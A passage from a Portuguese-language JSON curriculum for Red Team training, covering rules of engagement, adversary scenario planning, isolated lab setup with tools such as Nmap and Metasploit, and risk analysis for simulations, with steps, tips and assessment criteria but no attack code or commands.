                                "Conformidade Legal: Referências corretas a leis/políticas (essencial).",
                                "Praticidade: Fácil aplicação em campo (testável).",
                                "Estrutura: Organização lógica e visual (profissional).",
                                "Robustez: Cobertura de edge-cases (avançado)."
                              ],
                              "crossCurricularConnections": [
                                "Direito Cibernético: Aplicação de normas legais em docs operacionais.",
                                "Ética Profissional: Princípios de conduta em simulações.",
                                "Gerenciamento de Projetos: Definição de escopo e riscos.",
                                "Comunicações Técnicas: Redação clara de documentos especializados."
                              ],
                              "realWorldApplication": "Em pentests autorizados ou exercícios de Red Team em empresas/governos, ROE previne violações legais, limita danos colaterais e assegura que simulações mimetizem ameaças reais sem riscos desnecessários, como em operações da CERT.br ou NSA Red Teams."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.4.1.2",
                            "name": "Aplicar ROE durante simulações",
                            "description": "Monitorar e aderir às ROE em tempo real durante exercícios de Red Team, identificando e reportando violações potenciais para manter a integridade da operação.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar e Internalizar as Regras de Engajamento (ROE)",
                                  "subSteps": [
                                    "Ler integralmente o documento de ROE fornecido para o exercício",
                                    "Identificar e destacar regras principais relacionadas ao cenário de simulação",
                                    "Mapear ROE a ações específicas do Red Team, como alvos permitidos e métodos proibidos",
                                    "Criar um resumo pessoal com exemplos de aplicação",
                                    "Discutir ambiguidades com o facilitador ou equipe"
                                  ],
                                  "verification": "Realizar um quiz ou recitação oral das ROE principais com 100% de acerto",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documento oficial de ROE",
                                    "Caderno de anotações",
                                    "Ferramenta de quiz online (ex: Kahoot)"
                                  ],
                                  "tips": "Priorize regras de alto risco, como limites geográficos ou éticos, e use mnemônicos para memorização",
                                  "learningObjective": "Compreender e memorizar todas as ROE aplicáveis ao contexto da simulação",
                                  "commonMistakes": [
                                    "Ignorar regras secundárias que podem impactar ações primárias",
                                    "Não considerar variações contextuais das ROE",
                                    "Confundir ROE com diretrizes gerais de operação"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar o Ambiente de Simulação com Integração de ROE",
                                  "subSteps": [
                                    "Configurar ferramentas de simulação (ex: VMs, redes isoladas) conforme ROE",
                                    "Definir checkpoints de monitoramento ROE no plano de ataque",
                                    "Treinar a equipe em alertas rápidos para violações potenciais",
                                    "Testar configuração com um mini-exercício de validação ROE",
                                    "Documentar o setup com referências explícitas às ROE"
                                  ],
                                  "verification": "Checklist de setup aprovado pelo facilitador, sem discrepâncias com ROE",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Ambiente de simulação (ex: Cyber Range)",
                                    "Ferramentas de monitoramento (ex: Wireshark, SIEM simulado)",
                                    "Template de checklist ROE"
                                  ],
                                  "tips": "Integre alertas automáticos em ferramentas para flags de ROE em tempo real",
                                  "learningObjective": "Preparar um ambiente que facilite o monitoramento contínuo das ROE",
                                  "commonMistakes": [
                                    "Configurar alvos fora dos limites ROE por engano",
                                    "Esquecer de testar alertas antes da simulação principal",
                                    "Não envolver toda a equipe na configuração"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar Simulação com Monitoramento em Tempo Real das ROE",
                                  "subSteps": [
                                    "Iniciar a simulação seguindo o plano de ataque estritamente dentro das ROE",
                                    "Monitorar ações em tempo real usando dashboards e logs",
                                    "Pausar ações suspeitas imediatamente ao detectar potenciais violações",
                                    "Registrar todas as decisões relacionadas a ROE em log dedicado",
                                    "Manter comunicação constante com observadores para validação"
                                  ],
                                  "verification": "Logs da simulação mostram monitoramento contínuo sem violações não reportadas",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramentas de ataque simulado (ex: Metasploit, Nmap)",
                                    "Dashboards de monitoramento ROE",
                                    "Canal de comunicação segura (ex: Discord ou Teams)"
                                  ],
                                  "tips": "Use um 'ROE buddy' na equipe para dupla verificação em ações críticas",
                                  "learningObjective": "Aplicar ROE dinamicamente durante execução de simulações de Red Team",
                                  "commonMistakes": [
                                    "Prosseguir com ações ambíguas sem pausa",
                                    "Sobrecarregar logs sem foco em ROE",
                                    "Ignorar fadiga que leva a erros de julgamento"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Identificar, Reportar e Corrigir Violações de ROE",
                                  "subSteps": [
                                    "Analisar logs pós-ação para identificar violações reais ou potenciais",
                                    "Reportar incidentes via template padrão (o quê, quando, impacto)",
                                    "Implementar correções imediatas e ajustar plano para continuação",
                                    "Realizar debrief rápido com equipe sobre lições de ROE",
                                    "Atualizar documentação pessoal de ROE com casos aprendidos"
                                  ],
                                  "verification": "Relatório de violações submetido e aprovado, com plano de correção implementado",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Template de relatório ROE",
                                    "Logs de simulação",
                                    "Ferramenta de análise (ex: ELK Stack)"
                                  ],
                                  "tips": "Reporte proativamente potenciais violações para evitar escalada",
                                  "learningObjective": "Desenvolver habilidades de detecção e resposta rápida a issues de ROE",
                                  "commonMistakes": [
                                    "Minimizar violações em relatórios",
                                    "Atrasar reporte por análise excessiva",
                                    "Não integrar lições em futuras simulações"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma simulação de ataque a uma rede corporativa simulada, as ROE proíbem acessos a sistemas de dados sensíveis de saúde (HIPAA-like). Durante a execução, ao escanear sub-redes, uma ação revela um servidor médico; o Red Teamer pausa, verifica ROE, reporta ao controlador e redireciona o ataque para alvos permitidos, mantendo a integridade da operação.",
                              "finalVerifications": [
                                "Lista precisa de todas as ROE sem erros em teste oral",
                                "Identificação correta de 100% das violações em cenários simulados",
                                "Relatórios de ROE completos e oportunos em debrief",
                                "Execução de simulação sem violações reais reportadas",
                                "Ajustes proativos ao plano baseados em ROE durante a simulação",
                                "Feedback positivo de observadores sobre aderência"
                              ],
                              "assessmentCriteria": [
                                "Acurácia e completude no monitoramento de ROE (90%+)",
                                "Tempo de detecção e reporte de violações (< 2 minutos)",
                                "Qualidade dos relatórios (clareza, evidências, ações corretivas)",
                                "Integração de ROE no planejamento e execução",
                                "Capacidade de adaptação em cenários dinâmicos",
                                "Colaboração em equipe para verificação ROE"
                              ],
                              "crossCurricularConnections": [
                                "Ética Profissional: Decisões morais em operações cibernéticas",
                                "Direito e Compliance: Conhecimento de leis internacionais de ciberengajamento",
                                "Gestão de Riscos: Avaliação de impactos de violações ROE",
                                "Liderança e Trabalho em Equipe: Coordenação de alertas ROE",
                                "Análise de Dados: Interpretação de logs para detecção de violações"
                              ],
                              "realWorldApplication": "Em operações reais de Red Team para agências de defesa ou empresas, aplicar ROE durante simulações previne ações ilegais ou escaladas desnecessárias, como em exercícios conjuntos EUA-NATO, garantindo legalidade, proteção de ativos civis e credibilidade operacional."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.4.1.3",
                            "name": "Revisar e ajustar ROE pós-exercício",
                            "description": "Analisar logs de operações para avaliar a eficácia das ROE e propor ajustes baseados em lições aprendidas, melhorando futuras simulações.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Coletar e Organizar Logs e Dados Pós-Exercício",
                                  "subSteps": [
                                    "Reunir todos os logs de ferramentas de simulação (ex: Wireshark, SIEM, scripts de automação)",
                                    "Compilar relatórios qualitativos de participantes do Red Team e Blue Team",
                                    "Organizar dados cronologicamente e por categorias de ROE (ex: escopo, métodos permitidos)",
                                    "Extrair métricas chave como violações de ROE, tempo gasto em ambiguidades e resultados de missões",
                                    "Criar um repositório centralizado com índices pesquisáveis"
                                  ],
                                  "verification": "Todos os logs e relatórios estão catalogados em um dashboard acessível, com pelo menos 95% de cobertura de eventos do exercício.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Logs de simulação (SIEM, ELK Stack)",
                                    "Ferramentas de organização (Excel, Notion, Splunk)",
                                    "Templates de relatório pós-exercício"
                                  ],
                                  "tips": "Use tags padronizadas para ROE específicas para facilitar buscas posteriores.",
                                  "learningObjective": "Dominar a coleta sistemática de evidências para embasar análises imparciais.",
                                  "commonMistakes": [
                                    "Ignorar feedback qualitativo de participantes",
                                    "Falta de backup dos dados brutos",
                                    "Organização não padronizada levando a perda de informações"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Logs em Relação à Eficácia das ROE",
                                  "subSteps": [
                                    "Mapear incidentes nos logs contra cada cláusula das ROE originais",
                                    "Identificar ambiguidades, violações acidentais e gaps que impactaram a simulação",
                                    "Quantificar impactos (ex: missões falhadas por restrições de ROE, tempo perdido)",
                                    "Realizar entrevistas curtas com participantes para contextualizar logs",
                                    "Gerar visualizações como timelines e heatmaps de violações"
                                  ],
                                  "verification": "Relatório de análise preliminar com mapeamento completo de pelo menos 10 incidentes chave contra ROE.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Ferramentas de análise (Splunk, Kibana, Python com Pandas)",
                                    "ROE originais documentadas",
                                    "Gravações de debriefing"
                                  ],
                                  "tips": "Foquem em padrões recorrentes em vez de incidentes isolados para priorizar ajustes.",
                                  "learningObjective": "Desenvolver habilidades analíticas para correlacionar dados operacionais com regras formais.",
                                  "commonMistakes": [
                                    "Viés confirmatório ignorando sucessos das ROE",
                                    "Análise superficial sem quantificação",
                                    "Não cruzar dados de Red e Blue Teams"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Extrair Lições Aprendidas e Identificar Problemas",
                                  "subSteps": [
                                    "Categorizar lições em temas: clareza, abrangência, realismo e alinhamento com objetivos",
                                    "Priorizar problemas por impacto (alto/médio/baixo) e frequência",
                                    "Documentar root causes usando técnicas como 5 Whys",
                                    "Coletar inputs de stakeholders para validar achados",
                                    "Criar matriz de lições aprendidas com evidências dos logs"
                                  ],
                                  "verification": "Matriz de lições com pelo menos 5 itens priorizados, cada um ligado a evidências específicas.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Templates de lições aprendidas (After Action Review - AAR)",
                                    "Ferramentas colaborativas (Miro, Google Jamboard)",
                                    "Registros de entrevistas"
                                  ],
                                  "tips": "Envolva perspectivas diversas (Red Team, Blue Team, liderança) para robustez.",
                                  "learningObjective": "Capacitar a síntese de dados complexos em insights acionáveis.",
                                  "commonMistakes": [
                                    "Sobrecarga de lições triviais",
                                    "Não ligar lições a evidências concretas",
                                    "Ignorar lições positivas das ROE"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Propor e Documentar Ajustes às ROE",
                                  "subSteps": [
                                    "Redigir ajustes específicos para cada lição priorizada (ex: adicionar definições claras)",
                                    "Simular impactos dos ajustes em cenários passados usando logs",
                                    "Obter aprovação de stakeholders via revisão colaborativa",
                                    "Atualizar documento de ROE com versão rastreável (change log)",
                                    "Planejar teste dos novos ROE em exercício futuro"
                                  ],
                                  "verification": "Documento de ROE atualizado aprovado, com change log detalhando todas as modificações.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Documento mestre de ROE (Google Docs, Confluence)",
                                    "Ferramentas de versionamento (Git para docs)",
                                    "Lista de stakeholders"
                                  ],
                                  "tips": "Mantenha ajustes mínimos e testáveis para evitar complexidade desnecessária.",
                                  "learningObjective": "Aprender a iterar regras operacionais baseadas em evidências empíricas.",
                                  "commonMistakes": [
                                    "Ajustes muito vagos ou excessivamente restritivos",
                                    "Falta de simulação prévia",
                                    "Não documentar rationale dos changes"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma simulação de APT contra uma rede corporativa, logs revelaram que a ROE 'não escalar para sistemas de produção sem aprovação' causou atraso de 2 horas devido a ambiguidade sobre 'produção'. Análise levou a ajuste: 'Sistemas de produção definidos como VLAN 10-20; aprovação via canal #redteam-approval em 5min.' Isso acelerou futuras iterações em 40%.",
                              "finalVerifications": [
                                "ROE ajustadas incorporam todas as lições priorizadas dos logs",
                                "Change log rastreia todas as modificações com evidências",
                                "Stakeholders aprovaram os ajustes por escrito",
                                "Simulação rápida confirma redução de ambiguidades",
                                "Relatório final distribuído a todos os participantes",
                                "Plano para teste em próximo exercício definido"
                              ],
                              "assessmentCriteria": [
                                "Completude da análise de logs (cobertura >90%)",
                                "Relevância e especificidade dos ajustes propostos",
                                "Uso de evidências quantitativas e qualitativas",
                                "Clareza e rastreabilidade da documentação final",
                                "Engajamento de stakeholders no processo",
                                "Eficiência temporal dentro das estimativas"
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Uso de ferramentas como Splunk para insights",
                                "Gestão de Projetos: After Action Reviews e iterações ágeis",
                                "Liderança e Comunicação: Coleta de feedback multidisciplinar",
                                "Ética e Direito: Alinhamento de ROE com compliance cibernético"
                              ],
                              "realWorldApplication": "Em operações reais de Red Team em organizações como bancos ou governos, revisar ROE pós-exercício minimiza riscos legais, otimiza eficiência de testes de penetração e constrói maturidade em ciberdefesa, como visto em exercícios da NSA ou CERT teams."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.4.2",
                        "name": "Planejamento Operacional",
                        "description": "Processo estruturado para definir objetivos, cenários de ameaça e recursos necessários em operações ofensivas simuladas do Red Team.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.4.2.1",
                            "name": "Definir objetivos e cenários de ameaça",
                            "description": "Identificar metas realistas baseadas no mindset do adversário, criando cenários que repliquem táticas de atacantes reais, como APTs, com foco em planejamento detalhado.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Pesquisar Mindset e Táticas do Adversário",
                                  "subSteps": [
                                    "Identifique grupos APT relevantes (ex: APT28, Lazarus) via fontes como MITRE ATT&CK.",
                                    "Analise relatórios de incidentes reais para mapear TTPs (Tactics, Techniques, Procedures).",
                                    "Documente motivações, recursos e padrões de comportamento do adversário.",
                                    "Crie um perfil psicológico e operacional resumido.",
                                    "Compare com múltiplos APTs para padrões comuns."
                                  ],
                                  "verification": "Perfil do adversário documentado com pelo menos 5 TTPs citadas de fontes confiáveis.",
                                  "estimatedTime": "4-6 horas",
                                  "materials": "MITRE ATT&CK Framework, relatórios da Mandiant/ CrowdStrike, acesso à internet.",
                                  "tips": "Use frameworks como Diamond Model para estruturar a análise.",
                                  "learningObjective": "Compreender profundamente o mindset do adversário para basear objetivos realistas.",
                                  "commonMistakes": "Focar apenas em táticas técnicas, ignorando motivações estratégicas."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir Objetivos Realistas e Mensuráveis",
                                  "subSteps": [
                                    "Aplique critérios SMART (Specific, Measurable, Achievable, Relevant, Time-bound) aos objetivos.",
                                    "Alinhe objetivos com o mindset do adversário, como roubo de IP ou disrupção.",
                                    "Priorize 3-5 objetivos principais baseados em impacto potencial.",
                                    "Quantifique sucesso (ex: acesso a dados sensíveis em X dias).",
                                    "Valide viabilidade com recursos do Red Team disponíveis."
                                  ],
                                  "verification": "Lista de objetivos SMART documentada e alinhada ao perfil do adversário.",
                                  "estimatedTime": "2-4 horas",
                                  "materials": "Template SMART, planilha de planejamento, perfil do adversário do Step 1.",
                                  "tips": "Pense como o adversário: 'O que eu ganharia com isso?'",
                                  "learningObjective": "Criar objetivos acionáveis que reflitam intenções reais de atacantes.",
                                  "commonMistakes": "Definir objetivos muito ambiciosos ou genéricos sem base em TTPs reais."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Criar Cenários de Ameaça Detalhados",
                                  "subSteps": [
                                    "Mapeie cenários passo a passo replicando TTPs do adversário (ex: phishing inicial, lateral movement).",
                                    "Inclua variáveis como defesas da vítima e respostas esperadas.",
                                    "Desenvolva 2-3 cenários alternativos com ramificações.",
                                    "Integre objetivos do Step 2 em cada cenário.",
                                    "Adicione timelines e milestones para realismo."
                                  ],
                                  "verification": "Cenários documentados com fluxogramas e pelo menos 10 passos por cenário.",
                                  "estimatedTime": "6-8 horas",
                                  "materials": "Ferramentas de diagramação (Draw.io, Lucidchart), MITRE ATT&CK Navigator.",
                                  "tips": "Use narrativas em primeira pessoa do atacante para imersão.",
                                  "learningObjective": "Construir cenários que simulem operações reais de APTs.",
                                  "commonMistakes": "Criar cenários lineares sem considerar detecções ou falhas."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar e Refinar Objetivos e Cenários",
                                  "subSteps": [
                                    "Revise cenários com pares ou experts para realismo.",
                                    "Simule cenários em whiteboard ou ferramenta low-fidelity.",
                                    "Ajuste com base em gaps identificados (ex: defesas ausentes).",
                                    "Documente riscos e mitigações éticas/legais.",
                                    "Finalize documento de planejamento com aprovações."
                                  ],
                                  "verification": "Documento final revisado com feedback incorporado e sign-off.",
                                  "estimatedTime": "3-5 horas",
                                  "materials": "Ferramentas de colaboração (Teams/Slack), template de revisão.",
                                  "tips": "Grave sessões de revisão para lições aprendidas.",
                                  "learningObjective": "Garantir que planejamento seja robusto e aplicável.",
                                  "commonMistakes": "Ignorar restrições éticas ou legais no planejamento."
                                }
                              ],
                              "practicalExample": "Para simular APT41 (chinês), defina objetivo: 'Roubar blueprints de energia em 30 dias via supply chain compromise'. Cenário: Phishing em fornecedor -> Implantação de malware -> Exfiltração via C2 chinês, replicando TTPs reais de relatórios FireEye.",
                              "finalVerifications": [
                                "Objetivos são SMART e alinhados ao mindset do adversário.",
                                "Cenários replicam pelo menos 80% de TTPs reais de ATT&CK.",
                                "Timelines e recursos são realistas para Red Team.",
                                "Riscos éticos/legais documentados.",
                                "Fluxogramas completos sem ambiguidades.",
                                "Validação por pares confirmada."
                              ],
                              "assessmentCriteria": [
                                "Realismo: 40% - Baseado em evidências de APTs reais.",
                                "Detalhamento: 25% - Subpassos acionáveis e completos.",
                                "Mensurabilidade: 15% - Critérios claros de sucesso.",
                                "Criatividade: 10% - Cenários inovadores mas plausíveis.",
                                "Alinhamento: 10% - Integração perfeita com princípios Red Team."
                              ],
                              "crossCurricularConnections": [
                                "Psicologia: Análise comportamental do adversário.",
                                "Estratégia Militar: Planejamento de operações como OODA Loop.",
                                "Análise de Dados: Mapeamento de TTPs com frameworks.",
                                "Gestão de Projetos: SMART e gerenciamento de riscos."
                              ],
                              "realWorldApplication": "Em operações Red Team para empresas, define alvos para Purple Team exercises, simulando ataques APT em infraestruturas críticas, melhorando defesas proativas contra ameaças persistentes."
                            },
                            "estimatedTime": "5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.4.2.2",
                            "name": "Alocar recursos e montar ambiente de teste",
                            "description": "Selecionar ferramentas de ethical hacking, configurar ambientes isolados para jogos cibernéticos e atribuir papéis à equipe Red Team, conforme bibliografia como VEST e TUBBERVILLE.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Avaliar e Selecionar Ferramentas de Ethical Hacking",
                                  "subSteps": [
                                    "Revisar bibliografia como VEST e TUBBERVILLE para identificar ferramentas recomendadas para Red Team.",
                                    "Catalogar necessidades baseadas no escopo do jogo cibernético (ex: scanning, exploitation, post-exploitation).",
                                    "Listar ferramentas open-source como Kali Linux, Nmap, Metasploit, Wireshark e Burp Suite.",
                                    "Verificar compatibilidade, licenças e atualizações das ferramentas.",
                                    "Documentar seleção com justificativas e atribuir responsáveis por aquisição/instalação."
                                  ],
                                  "verification": "Lista documentada de ferramentas selecionadas com justificativas e responsáveis atribuídos.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Livros VEST e TUBBERVILLE",
                                    "Catálogos de ferramentas (Kali Linux docs, OWASP)",
                                    "Planilha de inventário (Google Sheets ou Excel)"
                                  ],
                                  "tips": "Priorize ferramentas gratuitas e comunitárias para simulações; teste em ambiente sandbox antes.",
                                  "learningObjective": "Dominar a seleção estratégica de ferramentas alinhadas ao mindset do adversário em operações Red Team.",
                                  "commonMistakes": [
                                    "Escolher ferramentas desatualizadas ou vulneráveis",
                                    "Ignorar requisitos de hardware",
                                    "Sobrecarregar com ferramentas desnecessárias"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Ambiente de Teste Isolado",
                                  "subSteps": [
                                    "Instalar hypervisor como VirtualBox ou VMware para criar VMs isoladas.",
                                    "Configurar rede interna isolada (NAT ou Host-Only) para simular alvos e atacantes sem acesso à rede real.",
                                    "Instalar sistemas operacionais alvo (ex: Windows vulnerável, Linux servers) e ferramentas em VMs dedicadas.",
                                    "Habilitar snapshots para resets rápidos e logging para auditoria.",
                                    "Testar conectividade interna e isolar completamente do mundo externo."
                                  ],
                                  "verification": "Ambiente rodando com VMs acessíveis apenas internamente, confirmado por ping e scans sem vazamento.",
                                  "estimatedTime": "6 horas",
                                  "materials": [
                                    "VirtualBox/VMware",
                                    "ISOs de OSs vulneráveis (ex: Metasploitable)",
                                    "Ferramentas de rede virtual"
                                  ],
                                  "tips": "Use firewalls e VLANs virtuais para reforçar isolamento; documente topologia de rede em diagrama.",
                                  "learningObjective": "Configurar ambientes seguros e realistas para jogos cibernéticos sem riscos externos.",
                                  "commonMistakes": [
                                    "Falhar no isolamento levando a vazamentos",
                                    "VMs sem snapshots causando perda de progresso",
                                    "Configurações de rede incorretas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Atribuir Papéis e Responsabilidades à Equipe Red Team",
                                  "subSteps": [
                                    "Mapear perfis da equipe (habilidades técnicas, experiência em ethical hacking).",
                                    "Definir papéis conforme VEST/TUBBERVILLE: Líder Red Team, Scanner, Exploiter, Post-Exploiter, Relator.",
                                    "Criar organograma e RACI matrix (Responsible, Accountable, Consulted, Informed).",
                                    "Realizar kickoff meeting para alinhar expectativas e regras de engajamento.",
                                    "Distribuir acesso a ferramentas e ambiente com credenciais limitadas."
                                  ],
                                  "verification": "Organograma e RACI assinados pela equipe, com meeting minutes documentados.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Templates RACI",
                                    "Ferramentas de colaboração (Teams/Slack)",
                                    "Lista de perfis da equipe"
                                  ],
                                  "tips": "Adapte papéis ao tamanho da equipe; inclua rodízio para desenvolvimento de skills.",
                                  "learningObjective": "Organizar equipe Red Team de forma eficiente para simular operações adversárias reais.",
                                  "commonMistakes": [
                                    "Papéis sobrepostos causando confusão",
                                    "Ignorar diversidade de skills",
                                    "Falta de comunicação clara"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar e Testar o Setup Completo",
                                  "subSteps": [
                                    "Executar teste end-to-end: scan inicial, simulação de exploit básico.",
                                    "Verificar logs, performance e isolamento do ambiente.",
                                    "Realizar walkthrough com equipe para confirmar acessos e papéis.",
                                    "Corrigir issues e atualizar documentação.",
                                    "Obter aprovação formal para prosseguir com o jogo cibernético."
                                  ],
                                  "verification": "Relatório de validação assinado, com evidências de testes bem-sucedidos.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Ferramentas de teste (Nmap, scripts simples)",
                                    "Checklist de validação"
                                  ],
                                  "tips": "Simule falhas comuns para testar resiliência; versionar o setup com Git.",
                                  "learningObjective": "Garantir que todos os recursos estejam operacionais antes do planejamento operacional.",
                                  "commonMistakes": [
                                    "Pular testes levando a falhas durante exercício",
                                    "Não documentar issues resolvidos",
                                    "Aprovação prematura"
                                  ]
                                }
                              ],
                              "practicalExample": "Para um jogo cibernético simulando ataque a uma rede bancária, selecione Nmap e Metasploit no Kali Linux; configure 3 VMs (atacante, servidor vulnerável, DC) em VirtualBox isolado; atribua papéis (Líder: coordena; Scanner: Nmap; Exploiter: Metasploit); valide com scan bem-sucedido sem vazamento externo.",
                              "finalVerifications": [
                                "Ambiente isolado confirmado sem conectividade externa.",
                                "Ferramentas instaladas e testadas em VMs.",
                                "Equipe com papéis atribuídos e RACI documentado.",
                                "Teste end-to-end executado com sucesso.",
                                "Documentação completa de setup disponível.",
                                "Aprovação formal obtida."
                              ],
                              "assessmentCriteria": [
                                "Seleção de ferramentas justificada por bibliografia e escopo.",
                                "Isolamento do ambiente 100% verificado.",
                                "Papéis atribuídos alinhados a skills da equipe.",
                                "Validação completa sem issues críticos.",
                                "Documentação clara e acionável.",
                                "Eficiência temporal respeitada (total <15h)."
                              ],
                              "crossCurricularConnections": [
                                "Gerenciamento de Projetos (alocação de recursos e RACI).",
                                "Administração de Sistemas (virtualização e redes).",
                                "Liderança e Dinâmicas de Equipe.",
                                "Ética e Governança em TI.",
                                "Análise de Riscos (identificação de falhas no setup)."
                              ],
                              "realWorldApplication": "Em pentests profissionais ou exercícios de Red Team em empresas, alocar recursos isolados e organizar equipes previne danos reais, cumpre regulamentações como GDPR e permite simulações autênticas de ameaças persistentes avançadas (APT)."
                            },
                            "estimatedTime": "6 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.4.2.3",
                            "name": "Realizar análise de riscos no planejamento",
                            "description": "Avaliar potenciais impactos das simulações, incluindo consciência situacional e indicadores de compromisso, para mitigar riscos reais durante o planejamento.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar riscos potenciais nas simulações",
                                  "subSteps": [
                                    "Mapear todos os elementos da simulação planejada (ativos, redes, sistemas simulados).",
                                    "Listar ameaças externas e internas que possam se materializar (ex.: detecção por equipes de defesa reais).",
                                    "Catalogar vulnerabilidades conhecidas no ambiente de teste.",
                                    "Priorizar riscos com base em probabilidade inicial e impacto estimado.",
                                    "Documentar em uma matriz de riscos inicial."
                                  ],
                                  "verification": "Matriz de riscos preenchida com pelo menos 10 itens identificados e priorizados.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramentas de mapeamento como Nmap ou draw.io",
                                    "Documentos de planejamento da operação",
                                    "Templates de matriz de riscos"
                                  ],
                                  "tips": "Use brainstorming em equipe para capturar perspectivas diversas e evitar viés.",
                                  "learningObjective": "Compreender e listar riscos específicos associados a simulações cibernéticas.",
                                  "commonMistakes": "Ignorar riscos não técnicos, como legais ou de reputação."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Avaliar consciência situacional",
                                  "subSteps": [
                                    "Analisar o nível atual de awareness das equipes de defesa (blue team).",
                                    "Simular cenários de detecção e mapear pontos cegos situacionais.",
                                    "Avaliar ferramentas de monitoramento ativas no ambiente.",
                                    "Identificar gaps na situational awareness que possam expor riscos reais.",
                                    "Registrar métricas qualitativas e quantitativas de consciência."
                                  ],
                                  "verification": "Relatório de consciência situacional com mapa de gaps e métricas definidas.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Relatórios de inteligência de ameaças",
                                    "Ferramentas de SIEM simuladas",
                                    "Diagramas de rede"
                                  ],
                                  "tips": "Considere o 'OODA Loop' do adversário para prever reações.",
                                  "learningObjective": "Desenvolver habilidade em mapear e quantificar consciência situacional em operações.",
                                  "commonMistakes": "Superestimar a inépcia da defesa e subestimar alertas automatizados."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar indicadores de compromisso",
                                  "subSteps": [
                                    "Definir IOCs (Indicators of Compromise) potenciais da simulação.",
                                    "Avaliar como esses IOCs podem ser detectados em ambientes reais.",
                                    "Simular detecção de IOCs e medir tempo de resposta esperado.",
                                    "Classificar IOCs por severidade e falsos positivos.",
                                    "Integrar análise em cenários de escalada de riscos."
                                  ],
                                  "verification": "Lista de IOCs analisados com classificações e simulações documentadas.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Bases de IOCs como MITRE ATT&CK",
                                    "Ferramentas como Zeek ou Suricata",
                                    "Logs de simulações anteriores"
                                  ],
                                  "tips": "Teste IOCs em ambiente isolado antes de análise principal.",
                                  "learningObjective": "Identificar e mitigar IOCs que possam comprometer a operação.",
                                  "commonMistakes": "Focar apenas em IOCs técnicos, ignorando comportamentais."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Desenvolver mitigações e plano de contingência",
                                  "subSteps": [
                                    "Para cada risco priorizado, propor pelo menos duas mitigações.",
                                    "Calcular risco residual pós-mitigação (probabilidade x impacto).",
                                    "Criar planos de contingência para riscos de alto impacto.",
                                    "Revisar com stakeholders para validação.",
                                    "Atualizar o plano operacional com medidas de risco."
                                  ],
                                  "verification": "Plano de mitigações aprovado com risco residual abaixo de threshold definido (ex.: 20%).",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Matriz de riscos atualizada",
                                    "Templates de plano de contingência",
                                    "Software de gerenciamento de riscos como RiskWatch"
                                  ],
                                  "tips": "Priorize mitigações custo-efetivas e reversíveis.",
                                  "learningObjective": "Criar estratégias proativas de mitigação de riscos operacionais.",
                                  "commonMistakes": "Criar mitigações genéricas sem tailoring ao contexto específico."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Documentar e revisar a análise de riscos",
                                  "subSteps": [
                                    "Compilar relatório final com todas as análises e decisões.",
                                    "Realizar revisão por pares ou com liderança do Red Team.",
                                    "Definir triggers para reavaliação durante a operação.",
                                    "Arquivar para lições aprendidas pós-exercício.",
                                    "Comunicar resumo executivo aos envolvidos."
                                  ],
                                  "verification": "Relatório final aprovado e arquivado, com plano de follow-up.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Ferramentas de documentação como Markdown ou Confluence",
                                    "Checklist de revisão"
                                  ],
                                  "tips": "Mantenha linguagem clara e visual para facilitar comunicação.",
                                  "learningObjective": "Garantir rastreabilidade e melhoria contínua na gestão de riscos.",
                                  "commonMistakes": "Pular revisão, levando a oversights não detectados."
                                }
                              ],
